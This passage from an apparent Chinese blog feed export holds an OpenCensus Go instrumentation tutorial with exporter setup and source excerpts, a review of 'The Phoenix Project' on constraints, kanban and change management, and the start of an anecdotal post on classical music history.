videoSize, Aggregation: view.Distribution(0, 1&lt;&lt;32, 2&lt;&lt;32, 3&lt;&lt;32),&#125;); err != nil &#123; log.Fatalf("Failed to subscribe to view: %v", err)&#125; Introspection | 内省OpenCensus 提供在线仪表板，显示进程中的诊断数据。这些页面被称为 z-pages ，它们有助于了解如何查看来自特定进程的数据，而不必依赖任何度量收集器或分布式跟踪后端。 OpenCensus Examples创建指标 定义指标类型 定义显示方式 Track Metrics 一般需要考虑服务负载（Server Load）、响应时间（Response Time）、误码率(Error Rates)等。 实例： opencensus-go-examples-helloworld opencensus-java-examples “Hello, world!” for web servers in Go with OpenCensus 1234567891011121314151617181920212223242526import ( "go.opencensus.io/stats" "go.opencensus.io/tag" "go.opencensus.io/stats/view")var ( requestCounter *stats.Float64Measure codeKey tag.Key DefaultLatencyDistribution = view.DistributionAggregation&#123;0, 1, 2, 3, 4, 5, 6, 8, 10, 13, 16, 20, 25, 30, 40, 50, 65, 80, 100, 130, 160, 200, 250, 300, 400, 500, 650, 800, 1000, 2000, 5000, 10000, 20000, 50000, 100000&#125;) codeKey, _ = tag.NewKey("banias/keys/code") requestCounter, _ = stats.Float64("banias/measures/request_count", "Count of HTTP requests processed", stats.UnitNone) view.Subscribe( &amp;view.View&#123; Name: "request_count", Description: "Count of HTTP requests processed", TagKeys: []tag.Key&#123;codeKey&#125;, Measure: requestCounter, Aggregation: view.CountAggregation&#123;&#125;, &#125;) // requestlatency ..... view.SetReportingPeriod(1 * time.Second) 收集指标数据 Call the Record method 1234567891011121314151617// Go Code Example// 说明：defer 用于资源的释放，会在函数返回之前进行调用。// 如果有多个 defer表达式，调用顺序类似于栈，越后面的 defer 表达式越先被调用。func (c *Collector) Collect(ctx *fasthttp.RequestCtx) &#123; defer func(begin time.Time) &#123; responseTime := float64(time.Since(begin).Nanoseconds() / 1000) occtx, _ := tag.New(context.Background(), tag.Insert(codeKey, strconv.Itoa(ctx.Response.StatusCode())), ) stats.Record(occtx, requestCounter.M(1)) stats.Record(occtx, requestlatency.M(responseTime)) &#125;(time.Now()) /*do some stuff */&#125; 第三方数据接口 | ExporterOpenCensus 是独立于供应商的。OpenCensus 收集和跟踪的应用指标可以在本地显示，也可将其发送到第三方分析工具或监控系统实现可视化，例如： Prometheus|普罗米修斯 Stackdriver|适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具 | 示例 Zipkin OpenCensus Tracing with Uber’s Jaeger project 1234567891011121314151617181920212223242526272829303132333435363738 import ( "go.opencensus.io/exporter/prometheus" "go.opencensus.io/exporter/stackdriver" openzipkin "github.com/openzipkin/zipkin-go" "go.opencensus.io/exporter/zipkin" xray "github.com/census-instrumentation/opencensus-go-exporter-aws" "go.opencensus.io/trace" "go.opencensus.io/stats/view")// Opention: Export to Prometheus Monitoring. Exporter, err := prometheus.NewExporter(prometheus.Options&#123;&#125;)if err != nil &#123; logger.Error("Error creating prometheus exporter ", zap.Error(err))&#125;view.RegisterExporter(pExporter) // Opention: Export to Stackdriver Monitoring.sExporter, err := stackdriver.NewExporter(stackdriver.Options&#123;ProjectID: config.ProjectID&#125;)if err != nil &#123; logger.Error("Error creating stackdriver exporter ", zap.Error(err))&#125;view.RegisterExporter(sExporter) // Opention: Export to Zipkin Monitoring.localEndpoint, err := openzipkin.NewEndpoint("service-A", "127.0.1.1:8080")reporter := http.NewReporter("http://127.0.1.110:9411/api/v2/spans")defer reporter.Close()exporter := zipkin.NewExporter(reporter, localEndpoint)trace.RegisterExporter(exporter) // Opention: Export to AWS X-Rayxe, err := xray.NewExporter(xray.WithVersion("latest"))if err != nil &#123; log.Fatalf("Failed to create AWS X-Ray exporter: %v", err)&#125;trace.RegisterExporter(xe) 数据可视化 函数内容为空（微秒级） 串行调用函数方法，内容包括网络访问和持久化操作（毫秒级） 并行调用函数方法（Go routine），内容与上同 多服务调用 第三部分：OpenCensus Principle | 工作原理 (待续)数据结构Span 共有属性： TraceId SpanId Start Time End Time Status Span 可选属性： Parent SpanId Remote Parent Attributes Annotations Message Events Links 12345678910111213141516171819202122232425//go.opencensus.io/trace.gotype Span struct &#123; // data contains information recorded about the span. // // It will be non-nil if we are exporting the span or recording events for it. // Otherwise, data is nil, and the Span is simply a carrier for the // SpanContext, so that the trace ID is propagated. data *SpanData // protects the contents of *data (but not the pointer value.) mu sync.Mutex spanContext SpanContext // spanStore is the spanStore this span belongs to, if any, otherwise it is nil. *spanStore endOnce sync.Once executionTracerTaskEnd func()&#125;type SpanContext struct &#123; TraceID TraceID SpanID SpanID TraceOptions TraceOptions&#125; 上下文 Context 上下文 Context 按照树型关系构建。以 Golang 为例，创建 Context 树第一步就是通过 context.Background() 得到根节点，再由 WithCancel()、WithTimeout() 等函数创建其它的子节点，孙节点。子节点从父节点复制得到，在子节点也可以设定新的状态值，如此就可以使元数据在子节点之间层层传递。 12345678910func Background() Contextfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)func WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)func WithValue(parent Context, key interface&#123;&#125;, val interface&#123;&#125;) Context gRPC Client 12345678910conn, err := grpc.Dial(address, grpc.WithStatsHandler(&amp;ocgrpc.ClientHandler&#123;&#125;), grpc.WithInsecure())defer conn.Close()c := pb.NewGreeterClient(conn)...for &#123; r, err := c.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: name&#125;)&#125; gRPC Server 1234567// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; ctx, span := trace.StartSpan(ctx, "sleep") time.Sleep(time.Duration(rand.Float64() * float64(time.Second))) span.End() return &amp;pb.HelloReply&#123;Message: "Hello " + in.Name&#125;, nil&#125; go.opencensus.io/trace.go 源码 12345678910111213141516171819202122232425//go.opencensus.io/trace.go// StartSpan starts a new child span of the current span in the context. If// there is no span in the context, creates a new trace and span.func StartSpan(ctx context.Context, name string, o ...StartOption) (context.Context, *Span) &#123; var opts StartOptions var parent SpanContext if p := FromContext(ctx); p != nil &#123; parent = p.spanContext &#125; for _, op := range o &#123; op(&amp;opts) &#125; span := startSpanInternal(name, parent != SpanContext&#123;&#125;, parent, false, opts) ctx, end := startExecutionTracerTask(ctx, name) span.executionTracerTaskEnd = end return NewContext(ctx, span), span&#125;// FromContext returns the Span stored in a context, or nil if there isn't one.func FromContext(ctx context.Context) *Span &#123; s, _ := ctx.Value(contextKey&#123;&#125;).(*Span) return s&#125; 视图 注册-订阅 模式 视图注册之后开始收集给定的数据。一旦该视图被订阅，它就向已注册的 Exporter 报送数据。 1234567891011121314151617// source code : go.opencensus.io/view/worker.go// Register begins collecting data for the given views.// Once a view is subscribed, it reports data to the registered exporters.func Register(views ...*View) error &#123; for _, v := range views &#123; if err := v.canonicalize(); err != nil &#123; return err &#125; &#125; req := &amp;registerViewReq&#123; views: views, err: make(chan error), &#125; defaultWorker.c &lt;- req return &lt;-req.err&#125; Exporter1234567891011121314151617181920// source: go.opencensus.io/trace/export.go// SpanData contains all the information collected by a Span.type SpanData struct &#123; SpanContext ParentSpanID SpanID SpanKind int Name string StartTime time.Time // The wall clock time of EndTime will be adjusted to always be offset // from StartTime by the duration of the span. EndTime time.Time // The values of Attributes each have type string, bool, or int64. Attributes map[string]interface&#123;&#125; Annotations []Annotation MessageEvents []MessageEvent Status Links []Link HasRemoteParent bool&#125; OpenCensu 资讯Microsoft joins the OpenCensus project | June 13,2018 We are happy to announce that Microsoft is joining the open source OpenCensus project, originally initiated and shepherded by Google, and we are excited to help it achieve the goal of “a single distribution of libraries for metrics and distributed tracing with minimal overhead.” 微软宣布加入开源项目 OpenCensus —— 最初是由 Google 发起和主导，旨在建立一个低开销的分布式追踪和度量库。 现代基于云的应用程序通常是分布式的, 需要专门的监测和追踪技术来跟踪定位故障和性能问题。Azure 应用程序内置 Application Map，应用程序映射|会审分布式应用程序 和 End-to-End Transaction Diagnostics，端到端跨组件事务诊断功能。但是目前的监测工具体系中缺乏一个标准化的平台来实现度量和分布式跟踪, 这些数据需要支持跨编程语言和技术栈。微软宣称将利用自己的经验和知识与 OpenCensus 社区合作, 在应用程序度量和分布式跟踪领域创建一个开放和可扩展的标准平台, 从而使所有客户受益。 Our goal is to leverage our experience and knowledge and combine it with that of OpenCensus community to create an open and extensible, standard platform for application metrics and distributed traces that will benefit all customers. Application Map，应用程序映射|会审分布式应用程序 应用程序映射可帮助发现性能瓶颈或热点失败的所有组件的分布式应用程序。在地图上的每个节点表示应用程序组件或其依赖项;并且有运行状况 KPI 和警报状态。可从任何组件单击以获得更详细的诊断，如 Application Insights 事件。 如果应用使用了 Azure 服务，还可以单击获得 Azure 诊断，如 SQL 数据库顾问建议。 End-to-End Transaction Diagnostics，端到端跨组件事务诊断 事务诊断功能将所有受 Application Insights 监视的组件中的服务器端遥测关联到一个单独的视图。Application Insights 可检测基础关系，并可用于诊断导致事务缓慢或失败的应用程序组件、依赖项或异常。 Others OpenCensus People 扩展阅读：分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 扩展阅读：开源架构技术漫谈 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 数据可视化（七）Graphite 体系结构详解 DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 “Hello, world!” for web servers in Go with OpenCensus OpenCensus: A Stats Collection and Distributed Tracing Framework | Wednesday, January 17, 2018 | Google Open Source Blog OpenCensus for Go gRPC developers Uber正式开源其分布式跟踪系统Jaeger | 2017年11月9日 Uber优步分布式追踪技术再度精进 Measure Once — Export Anywhere: OpenCensus in the wild opencensus-go-examples-helloworld-context MongoDB driver instrumented with OpenCensus in Go Go语言并发模型：使用 context | oscarzhao 2016年08月29日 理解Go Context机制 | 时间： 2016-08-02 Go语言实战笔记（二十）| Go Context | May 12, 2017]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈:从作坊到工厂的寓言故事]]></title>
    <url>%2F2018%2F04%2F10%2FDevOps-Phoenix%2F</url>
    <content type="text"><![CDATA[摘要 背景：《凤凰项目》的灵魂 管理约束：最大的瓶颈是人 任务追踪：可视化工作区和看板实践 改进日常工作：预防性维护 反常识：系统里要经常出些故障、人力资源使用率与效率成反比 安全与审计 IT 价值流：像电力一样无处不在 转变主要不是基于自动化，相反，这种不可思议的改进来自于调整关于工作系统的策略和控制半成品的策略，确保有一个高效的跨职能团队，让所有事情都为约束点服务，以及管理好工作交接。——《凤凰项目 一个IT运维的传奇故事》 谈到 DevOps 概念，有几本书是绕不过去的，《凤凰项目：一个IT运维的传奇故事》（The Phoenix Project:a Novel About IT,DevOps,and Helping Your Business Win）就是其中之一。本书的主要特色之一是将 IT 运营和工厂生产对应起来，借鉴制造业的经验提升 IT 价值。 背景：《凤凰项目》的灵魂《凤凰项目》的作者金(Gene Kim);贝尔(Kevin Behr);斯帕福德(George Spafford)，显然是高德拉特的拥趸。在整个故事中都贯穿了高德拉特的思想——约束理论(限制理论，Theory of Constraints，TOC)。 “不应该根据第一个工作站的效率来安排工作，而是根据瓶颈资源所能完成工作的速度来安排工作。” 埃利亚胡·高德拉特博士（Eliyahu M. Goldratt，1947－2011），以色列物理学家，同时是一位企业管理领域的大师。1984年，高德拉特博士发表了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement），书中以小说的形式提出了约束理论。他主张一个复杂的系统隐含着简单化，即使在任何时间，一个复杂的系统可能是由成千上万人和一系列设备所组成，但是只有非常少的变数或许只有一个，称为限制，它会限制（或阻碍）此系统达到更高的目标。在此基础上，他进一步提出了在制造业经营生产活动中定义和消除制约因素的一些规范化方法以支持连续改进（Continuous Improvement），例如约束理论之外还提出了关键链（Critical Chain Project Management，CCPM）项目规划和管理方法（与关键路径分析方法不同，它主要侧重于项目执行中所需的资源，关注资源依赖，强调监测项目的进展和缓冲的使用率，而不是规划个别任务的进展速度）。精益生产或者丰田生产系统在某种程度上也是以约束理论为基础的。 回到《凤凰项目》，它的体裁是按照时间线叙事的日记体：临危受命的主人公一直致力于改善各个约束点（瓶颈）对于整个组织能力的限制。起初是一个无可替代的工程师，接着是应用程序部署流程，安全审计，最后约束点移到了技术部门之外，甚至包括外部供应商。简单来说，小说的脉络遵循实践约束理论的基本步骤： 识别约束点； 利用约束点； 让所有其他活动都从属于约束点； 把约束点提升到新的水平； 寻找下一个约束点。 管理约束 “在瓶颈之外的任何地方作出的改进都是假象，在瓶颈之后作出任何改进都是徒劳的，而在瓶颈之前作出的任何改进则只会导致瓶颈处堆积更多的库存。” —— 艾利·高德拉特 最大的瓶颈是人如果希望通过这本书获得一些解决方案和技术细节的人估计要失望了，《凤凰项目》本质上是一本探讨如何提高组织效率的书，或者说主要是讨论人、顺带谈了一些协同方法论。 我相信很多人看完《凤凰项目》之后都会把故事里面里面一堆人物名字搞混，但是有一个角色甚至比较主角还有意思 —— 布伦特。个人能力超强，工作超努力，对各类技术细节了如指掌，所有大小项目大家都喜欢找他合作，有了问题也会第一时间想到他，典型的超级员工、英雄人物。与此同时，布伦特实际上并不像人们认为的那样聪明绝顶。他每天需要处理大量计划外工作，即使布伦特天天加班都完不成堆积如山的任务，最终造成了大量的任务积压，战略工作不断延期，管理层疲于应付各种投诉。我相信大多数发展中组织里面都会有这么一个角色存在。 新上任的主人公（比尔）将布伦特识别为 IT 生产环境中的约束点，并采取了更改工作流转的方式来避免布伦特被计划外工作打扰： 与 CEO 达成共识，调整布伦特的工作职责：允许他拒绝除凤凰项目（战略级）以外的任何工作； 设置资源防火墙，任何人需要“征用”他都必须经过其部门领导评估优先级，所有资源请求通过层层过滤才能达到布伦特； 围绕布伦特组建了一个二线梯队，负责学习他的工作经验、编写文档、甚至实现部分自动化，逐步替代布伦特处理任务，将布伦特从各种繁琐的事情中解放出来 可能他是故意让自己显得无可或缺，以免其他人抢了他的工作。… 是不是布伦特把他的知识看作一种权力。也许他身上的某些部分不愿意把那些知识交出来。这也确实让他成为了几乎难以取代的人。——《凤凰项目 一个IT运维的传奇故事》 第 107 页 值得注意的是，新的决策在开始阶段需要承受了很大的压力。领导人需要对抗的是长期形成的工作惯性，俗话说“病来如山倒、病去如抽丝”，想要改变也不是一朝一夕就可以实现的，更不要说组织内部微妙的人事关系，稍有不慎就可能踩到雷，顺畅的内部沟通、群众看得到的改进效果可以帮助解决一部分问题，但是现实中也有不可避免的碰撞。所以说，流程变更实质是是组织文化重塑的一种形式，领导者的信任与合作必不可少。这方面也是本书比较有趣的地方。 经过一段时间的坚持，布伦特的工作效率大大提升，顺利完成了凤凰项目，并在后来发起的独角兽和独角鲸项目取得了成功。 任务追踪凤凰项目故事中，主人公面对的困境是：IT 团队因为大量工作积压而导致各种任务延期。 这个世界一定是哪里不对劲了，一半邮件都是紧急邮件。所有事情都那么重要，这可能吗？ 经过一番梳理，IT 团队的各类工作内容大致可以分为以下四种类别： 第一类：业务项目，由 PMO 跟踪的正式项目； 第二类：IT 内部项目，由业务项目衍生的基础架构项目，或者改进项目；（* 生产能力投放度量） 第三类：变更（* 跨团队交接和重复跟踪） 第四类：计划外工作（救火工作） 计划外工作可不是免费的，恰恰相反，它非常昂贵。在故事的第一部分，计划外工作是最主要的困扰，它们包括突发严重故障、业务安全漏洞引发的舆论风波、部分领导人基于个人意愿追加的临时项目等等。如果要推动战略项目的进度，必须根除计划外工作的最大源头！ 计划外工作会让你丧失开展计划内工作的能力，因此必须不惜一切代价去消灭计划外工作，墨菲法则确实存在，因此总会有计划外工作，但你必须高效地处理它们。 第一优先级是谁喊得最响，决定因素是谁能搬出最大的领导来。我见过很多员工总是优先为某个经理服务，因为他每月带他们出去吃一次午餐。 为了改变这一局面，主人公采用了一种“可视化工作区+任务追踪系统”的方式管理变更。 任务可视化可视化的目的是为了做到充分的交流，就像风吹过树林，不分彼此的摇动每一片树叶。 可视化工作区运营中心（NOC）：一个巨大的开放式办公区域，靠一面墙放着一排长桌，巨大的显示器上显示着所有IT服务的各种状态。1级和2级客服人员占据了工作站的三排位置。“这并不是阿波罗13号的太空飞行指挥中心，但我就是这样向亲戚们解释我的工作环境的。” 在 NOC 运作的具体支撑手段上，高度重视看板墙（Kanban）的作用。 看板(Kanban)是一种生产管理系统，起源于1940年代的丰田汽车公司。看板的核心理论是基于制造业中经常提到的概念：库存。与传统会计观念不同，丰田认为库存会带来成本以及浪费，而不是增加或储存价值，应鼓励逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。1961 年 MIT（Sloan School of Management）教授 John Little 正式提出了利特尔法则（ Little’s Law ）：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 Cycle Time = Work in Progress / Throughput 根据利特尔法则，跟踪工作及进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。在 IT 语境中，半成品一般意味着积压的开发任务、等待启动的“重要不紧急”工作、“开发完成”但是未上线发布的新功能、等待执行的线上变更等等。 看板上的索引卡片是做成这件事最好的机制之一，因为每个人都能看到半成品。—— 《凤凰项目 一个IT运维的传奇故事》第 151 页 本书中关于看板（Kanban）实践的启示可以概括为以下几点： 目标导向：相对于强化审批流程，更重要的是通过任务卡片的梳理识别半成品积压在哪个环节，通过建立一条反馈环路能够一直往回通向产品定义、设计及开发的最初环节。 简洁性：例如一张变更索引卡片只要求填写必需的三条信息：变更计划的制定者、将要实施变更的系统以及一条一句话的概述，避免设置过多的必填字段和无效选项。繁琐而缺乏人性考量的工具难以发挥作用，最终将变成 “大家为了完成自己的工作，一直在胡乱对付这套系统”，再也没有比阻止人们去做他们理应做的事更能毁掉大家的热情和支持了。 灵活性：针对需要特别关注的问题可以采取灵活方式，不拘泥于死板格式。例如在第一部分首席工程师（布伦特）是一个阶段性瓶颈，各部门在提交卡片的时候就将“是否需要布伦特支援”作为必填信息，或者使用单独一种颜色的卡片。 控制半成品的能力不足，是造成长期性延误和质量问题的根源之一。 “完成”的真正定义 并非开发部完成了编码，而是只有在代码经过充分测试并按设计在生产中运行时，代码才算“完成”。 关于变更管理，还有一些具体的实践方法值得借鉴： 分级授权：可以把一部分变更审核委派给代理人 脆弱变更：列出了十大最脆弱的服务、应用程序和基础架构列表，可能会影响到其中任何一个的变更申请都将立刻标上记号，由 CAB 详细审查 标准变更（ITIL 名称）：对于之前已多次成功实施的变更，我们只需要提前批准就行。它们仍然需要提交，但可以不经过我们批准就安排操作日程。” 外部影响变更：对于‘复杂的中等变更’ 变更提交者有责任向可能受到影响的人员进行咨询并得到其认可，做完这些之后才可以将变更卡片送入审核流程。 禁止条款（透明化）：禁止未经授权的变更，禁止在服务中断期间出现未经公开的变更。 改进日常工作 改进日常工作比开展日常工作更重要。 预防性维护 技术债务。它来自于走捷径，那在短时间内也许行得通。但是就像金融债务一样，久而久之，利息成本会越滚越高。如果一个部门没有付清它的技术债务，公司的每一份努力都将以计划外工作的形式来偿还那些技术债务的利息。p186 如果你是一家跨国货运公司，你们用一百辆卡车组成的车队运送包裹，你们的一项公司目标就会是客户满意度和按时交货。一个影响按时交货的因素是车辆故障。车辆故障的一个关键起因是没有更换机油。那么，为了降低这个风险，你就要为车辆运营建立一个服务等级协议（SLA），每行驶五千英里就要更换一次机油。如果说按时交货是关键绩效指标（KPI），那么为了达到这个指标可以建立一个新的前瞻性KPI，比如说，已经按要求更换机油的车辆百分比。 对于 IT 组织来说，这一原则同样适用。 两个反常识的概念系统里要经常出些故障作者在书中提到一个观点：“系统里要经常出些故障，长此以往，再遇到困难就没有原来那么痛苦了。p216” 1960 年代，工业制造领域提出了弹性制造系统（Flexible Manufacturing System，FMS）的概念。FMS 的理想是制造系统能够富有弹性（能够因应预期或不可预期的变更），又兼有自动化设备规模生产的特性，以满足顾客对于产品要求多样化的趋势。制造系统的弹性通常被分为两类： “机器弹性”：涵盖了系统制造新产品的应变能力和零件工序改变的应变能力； “用途弹性”：同一组件可以使用不同机器设备而运行相同的工序之。 于 IT 生产而言，就有了弹性系统，即面对各种不确定场景时（如基础存储设施故障，恶意攻击，依赖服务故障，网络超时、中断等等）都能够存活并且具备一定的自愈能力的系统。弹性系统的出发点是承认在规模化服务的场景下，故障是常态的、不可预测的，既然不可避免，就需要在系统的生命周期去主动管理它，可以主动地给系统不断施加一些压力，从而不断强化习惯并加以改进。 Do not try to avoid failures ! Embrace them ! 具体策略方面，可以将改进周期设定为小段时间，例如每次为期两周，每期都实施一个小型的改进项目，例如周期性的服务中断演练。每次日常改进都需要覆盖“设计—检测—恢复—预防”的各个环节，只有不断重复才能建立信任感和透明度，对需要团队合作的事情来说尤其如此。 建立起部落文化般的工作共识，这帮助我们比以往任何时候都能够更快地排除故障，而且，一旦真的需要把工作升级，也是可控而有序的。p263 人力资源使用率与效率成反比每个人都需要空闲时间，或者说松弛时间。如果大家都没有松弛时间，半成品就会卡在系统里。或者更确切地说，卡在队列里，只是干等着。 图表说明：横坐标轴上是给定资源的忙碌百分比，纵坐标轴上是大致的等待时间（更确切地说是队列长度）。曲线的形状表明，当资源使用率超过80%时，等待时间就会直线上升。 等待时间取决于资源使用率。如果一个资源的忙碌时间是50%，那么它的空闲时间也是 50%。等待时间就是50%除以50%，也就是一个时间单位（可以简化理解为 1 个小时）。另一方面，如果一个资源 90% 的时间是忙碌的，等待时间=90% /10%，也就是说至少 9 个小时。换言之，任务排队等待的时间，将是资源有 50% 空闲时的 9 倍。 例如，小说中的技术大拿（布伦特），30分钟的简单变更需要耗费几个星期才能完成。原因很简单，作为所有工作的瓶颈，布伦特的使用率一直是100%甚至超过100%，因此，每次交给他的工作都只能在队列里枯等，如果不进行加速或升级处置，就永远不会完成。 再进一步，如果简单任务实际需要 5 个以上交接步骤（分析、设计、程序、测试、发布、线上变更等），情况又会如何呢？假设所有工作中心都有 90% 的时间是忙碌的，由图上可知，在每一个工作中心的平均等待时间是 9 个小时。总共等待时间就是 5倍：45 个小时。高资源使用率带来的破坏性结果恐怕也就无需多言了。 因此，削减非必要人工环节、管理交接工作是提高资源周转率的关键。 安全与审计 信息安全部总是到处亮出他们的“尚方宝剑”，提出各种紧急要求，全然不顾这样做对其他部门造成的后果，因此我们有很多会议都不邀请他们参加。只要有他们在，事情肯定办不成。p35 一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。就是这样。你和约翰所谈论的正是所谓‘COSO立方’（内部控制整合框架）的不同面。” p241 本书故事中着重探讨了信息安全与审计工作，例如技术部门与内部审计部门的矛盾冲突、将安全审计置于开发构建过程之中等挺有意思的。这块比较复杂，以后再补充。 IT 价值流：像电力一样无处不在 IT 不只是一个部门。相反，它就像电力一样无处不在。IT 是一种技能，就像能读会算一样。在无极限零部件公司，我们没有一个集中的阅读或计算部门——我们希望每一个雇员都多少掌握这些技能。理解技术能够做什么、不能做什么，已经成为这家公司里每个部门必须具备的一种核心竞争力。要是业务经理领导了一个不具备这种技能的团队或项目，他们就会失败。——《凤凰项目 一个IT运维的传奇故事》第 316 页 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 扩展阅读：凤凰项目作者推荐书单 《The DevOps Cookbook》(开发运维指导书) 《持续交付：发布可靠软件的系统方法》 《目标：一种持续改进的流程》1984年，埃利亚胡·高德拉特博士撰写了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement）。这是一本苏格拉底式的小说，主人公是一位名叫亚历克斯·罗戈的工厂经理，他必须在90天内解决成本和按时交货的问题，否则他的工厂就要被关停。 高德拉特博士在他的后一本书 《绝不是靠运气》（It’s Not Luck） 中，阐述了他称之为“思维过程”的内容。那是一套了不起的方法论（但是多少有些难以做到，且往往见效缓慢），主要是教公司如何识别长期的核心冲突、了解现状、描述理想的未来状况，以及多种提高成功可能性的策划技巧。 华盛顿州立大学网站“EM526 约束管理”（课程），http://public.wsu.edu/~engrmgmt/holt/em530/index.htm 学习“思维过程”的教科书《逻辑化思维过程》，作者H.威廉·德特曼博士。 《丰田管理：为了获得改进、适应性和优异业绩而管理员工》 Toyota Kata : Managing People for Improvement , Adaptive nessand SuperiorResults 《团队领导的五大障碍：关于领导力的寓言》 The Five Dysfunction sofa Team : A Leader ship Fable 作者：帕特里克·兰西奥尼 团队达成目标的一个核心诱因是信任缺失。在他的模型中，五大障碍被描述为： 信任缺失——不愿在团队中显示弱点； 惧怕冲突——在充满激情的建设性辩论中寻求和谐的假象； 缺乏诚意——假意与团队的决策达成一致，形成模棱两可的公司氛围； 回避问责——面对员工的失职行为，逃避追责，降低了工作标准； 忽视结果——对个人成就、地位和自我价值的关注超过了对团队成功的关注。 参考文献 豆瓣|《凤凰项目|The Phoenix Project》 《凤凰项目》内容梳理|龙井的博客 The Cybersecurity Canon: The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win 以色列物理学家、约束理论创始人埃利亚胡·戈德拉特逝世 | 2011 年 弹性工程-构建弹性系统|曾绿麟|美团]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典音乐低俗史]]></title>
    <url>%2F2018%2F04%2F10%2FArtistic-Classical%2F</url>
    <content type="text"><![CDATA[摘要 古典音乐低俗史 古典音乐经典名曲 古典音乐低俗史 “没有音乐，生活将是一种错误。” —— 尼采 今年的3月25日，是法国现代最伟大的音乐家、被称为“现代音乐之父”的阿希尔-克洛德·德彪西（Achille-Claude Debussy，1862－1918）逝世100周年。德彪西在生前已享誉厚载，是法兰西学院院士，是鲜有的头像被印在法郎纸币上的法国音乐家之一。 德彪西的作品在传统法国音乐风格中，结合了东方音乐、西班牙舞曲和爵士乐的特点，创造出了其别具一格的和声。德彪西被总括为印象派音乐的代表，虽然他本人并不同意，甚至设法远离这一称谓。德彪西的一生经历的女性数不胜数，其中至少两次发生自杀事件： 玛丽·布兰奇·瓦斯尼尔：年长德彪西十一岁的人妻； 加布里埃尔·杜邦（加比，Gaby）：与德彪西同甘共苦以支持家用，但是被德彪西无情抛弃，引发了自杀风波； 特蕾丝·罗杰：32岁的女歌手，突然宣布结婚但是在婚礼和婚房都准备完毕时发现了加比的存在，单方面宣布解除婚约； 莉莉（Lily）: 女性服装店模特，比德彪西小十一岁；她生病时德彪西与爱玛私奔，企图用手枪自杀（未遂）； 爱玛（Emma)：德彪西的钢琴学生的母亲，富裕的银行家的妻子，与德彪西同龄；在世人眼中，他们的关系只是为了金钱。 《春之祭》（Le Sacre du Printemps）是俄罗斯作曲家伊戈尔·斯特拉文斯基的代表作与成名作。全曲粗犷而又有浓郁的俄罗斯风格，是二十世纪古典音乐创作的典范。斯特拉文斯基幻想出一个俄罗斯远古时期的祭祖仪式景象：“我想像到一个肃穆的异教祭典：一群长老围成一圈坐着，看见一位少女被要求跳舞直至跳死。她是他们用以祭祀春天之神的祭品。” 音乐史上，《春之祭》的首演便是一场著名的骚乱。 1913 年巴黎香榭丽舍剧院举行首演时，狂乱的节奏及旋律，颠覆传统芭蕾的舞步，都让观众陷入疯狂，支持者和反对者在席间互相叫嚣，甚至大打出手：从管弦乐团的序奏开始，观众席上不满的声音便此起彼伏、骂声不断，强烈的抗议声和对抗议声的抗议声竞相交错，嘘声、口哨、踏步声、拍手声不绝于耳。 巴洛克时代，最优秀的乐团一般由教会与贵族赞助。贵族在乡村建立城堡或宫殿，并雇用一支常驻乐队来凸显自身品味，甚至还有宫廷御用的乐队作曲家写作大量新乐曲，歌剧也日益流行。1781年，莱比锡布商大厦管弦乐团成立，标志着市民管弦乐团的开始，1842年，著名的纽约爱乐乐团和维也纳爱乐乐团陆续成立。19世纪这种属于中产市民(在贵族或教会眼中，他们大概也是粗俗、缺乏教养的同义词）的乐队形式随着城市中产阶级崛起而发展迅速。 然而，观众席中有一个人（可可·香奈儿）注意到了这位被观众的喧哗沉重打击的音乐天才，电影《香奈儿秘密情史》 中完美重现了这一场景。 “音乐表现越是本质、单纯，效果也就越直接、强烈。” —— 奥尔夫 《布兰诗歌》源自德国巴伐利亚的布兰修道院（Burana，始建于公元 740 年）中发现的一本 13 世纪手稿 —— 由神职人员、落魄文人和流浪学生们用拉丁文和中世纪德语记录的诗歌集，20 世纪由作曲家卡尔·奥尔夫编写成曲。 这首曲中所唱的题材无外乎三个：春、酒还有求爱。比如第 14 曲 “我在酒吧的时候”，歌词极其简单粗暴： 太太喝，先生喝；大兵喝，牧师喝；男人喝，女人喝；白人喝，黑人喝；成家立业的喝，漂泊无依的喝；蠢东西喝，聪明人喝，穷鬼同病夫喝…… 